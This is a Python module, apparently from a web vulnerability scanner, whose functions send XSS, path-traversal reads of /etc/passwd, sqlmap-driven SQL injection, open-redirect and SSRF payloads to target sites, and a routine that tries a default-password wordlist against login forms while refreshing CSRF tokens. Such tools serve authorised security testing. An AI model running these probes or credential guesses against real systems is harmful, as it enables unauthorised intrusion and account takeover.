import requests
from src import toolbox
from src.webutils import get_headers, get_page_source, search_page_for_form
from src.networkutils import PortScanner
from urllib.parse import quote_plus
import subprocess
from urllib.parse import urlparse, urljoin
import re
from alive_progress import alive_bar
import socket, errno
import ipaddress
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import time

def search_reflection(page:str,payload):
        """
        search for payload inside response page
        """
        line = ""
        cnt = 0
        for c in page:
            cnt += 1
            if c == "\n":
                if line.find(payload) != -1:
                    if line.find(f"value=\"{payload}") != -1:
                        return True, "value"
                    return True, None
                line = ""
            else:
                line += c
        return False, None

def test_reflection(url:str,param:str,method:str,type:str)->str:
    """
    test reflection with a parameter for XSS attack
    """

    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src=\"lincox\">"
    ]

    counter = 0
    found = 0
    confidence = "low"
    best_payload = ""

    for payload in payloads:
        if method == "GET":
            r = requests.get(f"{url}/?{param}={quote_plus(payload)}",headers=get_headers())
        elif method == "POST":
            r = requests.post(f"{url}",data={param:payload},headers=get_headers())

        result, context = search_reflection(r.text,payload)
        if result:
            found += 1
            best_payload = payload
            if context == "value" and counter >= 1:
                # quote not escaped inside a value="" 
                confidence = "high"
            if counter > 1:
                confidence = "high"
        counter += 1

    if found == 0:
        return None
    else:
        return quote_plus(best_payload), confidence

def test_dom_reflection(url:str,param:str,type:str)->str:
    """
    test reflection with a parameter for DOM based XSS attack
    """ 
    
    payloads = [
        "lincox><",
        "lincox\"=",
        f"</{type}><img src=\"lincox\">"
    ]

    counter = 0
    found = 0
    confidence = "low"
    best_payload = ""

    for payload in payloads:
        page = get_page_source(f"{url}?{param}={payload}")
        result, context = search_reflection(page,payload)
        if result:
            found += 1
            best_payload = payload
            if context == "value" and counter >= 1:
                # quote not escaped inside a value="" 
                confidence = "high"
            if counter > 1:
                confidence = "high"
        counter += 1

    if found == 0:
        return None
    else:
        return best_payload, confidence

def search_lfi_marker(html:str,os_type:str)->bool:
    """
    search for LFI markers in a web page
    depending on the OS
    os_type : linux or windows
    """

    if os_type == "linux":
        line = ""
        for c in html:
            if c == '\n':
                if line.find('0:0:root') != -1: # first line of /etc/passwd in linux system
                    return True
                line = ""
            else:
                line += c
    
    # TODO : windows marker
    
    return False
    
def test_lfi_linux(url:str,params:list,method:str)->str:
    """
    test for LFI in parameters with linux payload
    """

    if method.lower() == "get":

        # simple test
        parameters = "?"
        payload = '/etc/passwd'
        for param in params:
            parameters += f"&{param}={quote_plus(payload)}"
        r = requests.get(url+parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            parameters = "?"
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            for param in params:
                parameters += f"&{param}={quote_plus(payload)}"
            r = requests.get(url+parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    if method.lower() == "post":
        # simple test
        payload = '/etc/passwd'
        parameters = {}
        for param in params:
            parameters[param] = payload
        r = requests.post(url,data=parameters,headers=get_headers())
        result = search_lfi_marker(r.text,"linux")
        if result:
            return parameters

        # simple directory traversal
        for i in range(1,11):
            payload = 'file_lincox/' + '../'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

        # simple filter evasion
        for i in range(1,11):
            payload = 'file_lincox/' + '..//'*i+'/etc/passwd'
            parameters = {}
            for param in params:
                parameters[param] = payload
            r = requests.post(url,data=parameters,headers=get_headers())
            result = search_lfi_marker(r.text,"linux")
            if result:
                return parameters

    return None

def test_sqli(command:list,url:str,params:list,method:str)->list:
    """
    use SQL map to search for SQL injection
    no risk/level tuning for now
    """

    
    parameters = ""
    
    for param in params:
        parameters += f"&{param}=lincox@gmail.com"
    
    if method.lower() == "get":
        command += [
            '-u', url+'?'+parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]

    if method.lower() == "post":
        command += [
            '-u', url,
            '--data',parameters,
            '--batch',
            '--output-dir','sqlmap_output',
            '--dump-format=csv',
            '--ignore-code','404'
        ]
    
    process = subprocess.run(command, capture_output=True, text=True, check=False)

    output = process.stdout
    # if process.returncode != 0 :
    #     toolbox.warn(f"sqlmap returned a non zero error code {process.returncode}")
    #     toolbox.warn(f"sqlmap stderr: {process.stderr}")
    #     print(output)

    # print(output)

    found_parameters = re.finditer(r"---\n(Parameter:.*)---", output,re.MULTILINE|re.DOTALL|re.IGNORECASE)
    results = []

    for parameter in found_parameters:

        pattern = r"""
        \s*Type:\s*(?P<type>.*)\n
        \s*Title:\s*(?P<title>.*)\n
        \s*Payload:\s*(?P<payload>.*)\n
        """

        matches = re.finditer(pattern, parameter.group(), re.VERBOSE)
        parameter = re.findall(r"Parameter: (.+)", parameter.group())[0]

        for match in matches:
            toolbox.debug(f"Found injection {match.group('type')} / {match.group('title')} on {parameter} at {url}")
            results.append((url,method,parameter,match.group("type"),match.group("title"),match.group("payload").strip()))
    
    return results if len(results) > 0 else None

def test_open_redirect(url:str,parameter:str)->str:
    """
    test for open redirect in GET parameter on given url
    """

    timeout = 5

    test_url = url + '?' + parameter + f"=//google.com/{url}"
    # toolbox.debug(f"Testing URL: {test_url}")
    response = requests.get(test_url, allow_redirects=False, timeout=timeout, headers=get_headers())

    if 300 <= response.status_code < 400:
        redirect_location = response.headers.get("Location")
        if redirect_location:
            toolbox.debug(f"Redirect found: {response.status_code} to {redirect_location}")
            if is_external_redirect(url, redirect_location):
                    toolbox.debug(f"Open Redirect Found: {test_url} redirects to external url {redirect_location}")
                    return "external"
            else:
                toolbox.debug(f"Internal Redirect: {test_url} redirects to {redirect_location}")
                return "internal"
    elif response.status_code != 200:
        toolbox.debug(f"Unexpected status code: {response.status_code}")

    return False

def is_external_redirect(original_url:str, redirect_url:str)->bool:
    """
    Check if a redirect is external (to a different domain)
    """
    original_domain = urlparse(original_url).netloc
    redirect_domain = urlparse(redirect_url).netloc

    if not redirect_domain:
        return False

    return original_domain != redirect_domain

def test_default_credentials(form:dict)->dict:
    """
    test for most used credentials:
    """

    def update_csrf(r,form):
        forms = search_page_for_form(r.text,form['url'])
        for current_form in forms:
            if current_form['url'] == form['url'] and current_form['url'] == form['url']:
                for param in current_form['parameters']:
                    if param['name'] == csrf_param:
                        form['parameters'][csrf_index]['value'] = param['value']
        return form


    counter = 0
    is_first = True
    default_size = 0
    default_size_empty = 0
    default_redirect = None
    previous_page = None

    credentials_list = []
    valid = []
    potential = []
    has_csrf = False
    csrf_param = None
    csrf_index = None
    session = requests.Session()

    possible_csrf_params = [
        "csrf_token",
        "csrf",
        "_csrf",
        "_token",
        "X-CSRF-Token",
        "user_token",
        "token",
        "authenticity_token",
        "csrfmiddlewaretoken",
        "security_token",
        "xsrf_token",
        "request_token",
        "csrfParam",
        "session_token",
        "csrfToken",
        "x-csrf-token"
    ]
    
    c = 0
    for param in form['parameters']:
        if param['name'].lower() in possible_csrf_params:
            toolbox.aprint(f"Form at {form['url']} use a CSRF parameter : {param['name']}")
            has_csrf = True
            csrf_param = param['name']
            csrf_index = c
        c += 1

    r = session.get(form['origin_url'],headers=get_headers())
    if has_csrf:
        form = update_csrf(r,form)

    # wordlist format : Vendor,Username,Password,Comments
    with open("data/default-passwords.csv") as wordlist:
        for line in wordlist:
            line = line.replace('\n','').split(',')
            username, password = line
            if (username,password) not in credentials_list:
                credentials_list.append((username,password))

    credentials_list = list(set(credentials_list))

    with alive_bar(len(credentials_list), title=toolbox.get_header("ATTACK")+f"Trying default credentials on {form['url']}", bar=None, enrich_print=False) as bar:
        for username,password in credentials_list:

            if form['method'].lower() == 'get':
                parameters = "?"
                for param in form['parameters']:
                
                    if param['name'].find('user') != -1 or param['name'].find('email') != -1:
                        parameters += f"&{param['name']}={quote_plus(username)}"
                    elif param['name'].find('password') != -1 or param['name'].find('passwd') != -1:
                        parameters += f"&{param['name']}={quote_plus(password)}"
                    else:
                        if param['value'] == '' or param['value'] == None:
                            parameters += f"&{param['name']}=lincox"
                        else:
                            parameters += f"&{param['name']}={param['value']}"

                if is_first:
                    is_first = False
                    def_parameters = "?"
                    for param in form['parameters']:
                        if param['value'] == '' or param['value'] == None:
                            def_parameters += f"&{param['name']}=lincox@gmail.com"
                        else:
                            def_parameters += f"&{param['name']}={param['value']}"
                    r = session.get(form['url']+def_parameters,headers=get_headers())
                    default_size = len(r.text.split(' '))
                
                r = session.get(form['url']+parameters,headers=get_headers())
                if len(r.text.split(' ')) != default_size:
                    valid.append((username,password))
                    session = requests.session()

            if form['method'].lower() == 'post':
                parameters = {}
                for param in form['parameters']:
                
                    if param['name'].find('user') != -1 or param['name'].find('email') != -1:
                        parameters[param['name']] = username
                    elif param['name'].find('password') != -1 or param['name'].find('passwd') != -1:
                        parameters[param['name']] = password
                    else:
                        if param['value'] == '' or param['value'] == None:
                            parameters[param['name']] = "lincox"
                        else:
                            parameters[param['name']] = param['value']
                    
                if is_first:
                    is_first = False
                    def_parameters = {}
                    for param in form['parameters']:
                        if param['value'] == '' or param['value'] == None:
                            def_parameters[param['name']] = "lincox@gmail.com"
                        else:
                            def_parameters[param['name']] = param['value']
                    r = session.post(form['url'],data=def_parameters,headers=get_headers(),allow_redirects=False)
                    default_size = len(r.text.split(' '))
                    if default_size == 1:
                        if 300 <= r.status_code < 400:
                            default_redirect = r.headers["Location"]
                    toolbox.debug(f"Default response for form at {form['url']} : {default_size} words")
                    previous_page = r.text 

                    if has_csrf:
                        form = update_csrf(r,form)

                    for param in def_parameters:
                        if def_parameters[param] == "lincox@gmail.com":
                            def_parameters[param] = ""

                    r = session.post(form['url'],data=def_parameters,headers=get_headers(),allow_redirects=False)
                    default_size_empty = len(r.text.split(' '))
                    toolbox.debug(f"Default response for empty form at {form['url']} : {default_size_empty} words")
                    

                request_valid = False
                r = session.post(form['url'],data=parameters,headers=get_headers(),allow_redirects=False)
                previous_page = r.text
                response_size = len(r.text.split(' '))

                if (response_size != default_size and response_size != default_size_empty) or (default_redirect and "Location" in r.headers and default_redirect != r.headers['Location']):
                    
                    if default_size != default_size_empty and (username == "" or password == ""):
                        toolbox.debug(f"Possible valid credential on {form['url']} : {username} : {password}")
                        potential.append((form['url'],username,password))
                    else:
                        valid.append((username,password))
                        # restart Session
                        session = requests.Session()
                        r = session.get(form['url'],headers=get_headers())
                        toolbox.debug(f"Found valid credential on {form['url']} : {username} : {password}, length {response_size}")
                        if has_csrf:
                            form = update_csrf(r,form)

            bar()
    
    if len(valid) > 0:
        return valid, potential
    else:
        return None

pingback_received = False

def test_ssrf(url:str,params:list,method:str,req_id:str)->str:
    """
    very simple test for SSRF in parameters
    """

    global pingback_received

    pingback_received = False

    def get_local_ip():
        """
        Gets the local IP address
        """
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))  # Connect to a public DNS server
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception as e:
            print(f"Error getting local IP: {e}")
            return "127.0.0.1" # fallback to localhost

    
    def is_valid_ip(ip):
        """
        check if ip address is valid
        """
        try:
            ipaddress.ip_address(ip)
            return True
        except ValueError:
            return False

    class QuietHTTPRequestHandler(BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            return

        def do_GET(self):
            global pingback_received
            toolbox.debug(f"Pingback received from: {self.client_address[0]} - Path: {self.path}")
            if self.path == f"/lincox_{req_id}.png":
                pingback_received = True
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"lincox")

    def start_web_server(port):
        httpd = HTTPServer(('', port), QuietHTTPRequestHandler)
        thread = threading.Thread(target=httpd.serve_forever)
        thread.daemon = True
        thread.start()
        toolbox.debug(f"Web server started on port {port}")
        return httpd

    web_server_port = 8000
    port_available = False
    while not port_available:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
             s.bind(("127.0.0.1", web_server_port))
             port_available = True
             s.close()
        except socket.error as e:
            if e.errno == errno.EADDRINUSE:
                web_server_port += 1
    
    httpd = start_web_server(web_server_port)
    
    local_ip = get_local_ip()
    injection_url = f"http://{local_ip}:{web_server_port}/lincox_{req_id}.png"

    # TODO : add payloads to test for different URL scheme

    if method.lower() == "get":
        parameters = "?"
        for param in params:
            parameters += f"&{param}={quote_plus(injection_url)}"
        
        r = requests.get(url + parameters, headers=get_headers(), allow_redirects=False)
    
    
    if method.lower() == "post":
        parameters = {}
        for param in params:
            parameters[param] = injection_url

        r = requests.post(url, data=parameters, headers=get_headers(), allow_redirects=False)


    httpd.shutdown()

    if pingback_received:
        return parameters
    else:
        return False

def test_csrf(form:dict)->int:
    """
    test if CSRF protection is in place and if it's used
    """

    possible_csrf_params = [
        "csrf_token",
        "csrf",
        "_csrf",
        "_token",
        "X-CSRF-Token",
        "user_token",
        "token",
        "authenticity_token",
        "csrfmiddlewaretoken",
        "security_token",
        "xsrf_token",
        "request_token",
        "csrfParam",
        "session_token",
        "csrfToken",
        "x-csrf-token"
    ]

    has_csrf_param = False
    for param in form['parameters']:
        for possible_param in possible_csrf_params:
            if possible_param.lower() in param['name'].lower():
                # toolbox.debug(f"Found CSRF parameter : {param['name']}")
                has_csrf_param = True

    if has_csrf_param:
        # possible CSRF parameter
        r = None
        if form['method'].lower() == "get":
            parameters = "?"
            for param in form['parameters']:
                parameters += f"&{param['name']}=lincox@gmail.com"
            
            r = requests.get(form['url'] + parameters, headers=get_headers())
        
        
        if form['method'].lower() == "post":
            parameters = {}
            for param in form['parameters']:
                parameters[param['name']] = "lincox@gmail.com"

            r = requests.post(form['url'], data=parameters, headers=get_headers())

        if 400 <= r.status_code < 500:
            return False
        else:
            return 2
    else:
        # no CSRF parameter found
        return 1
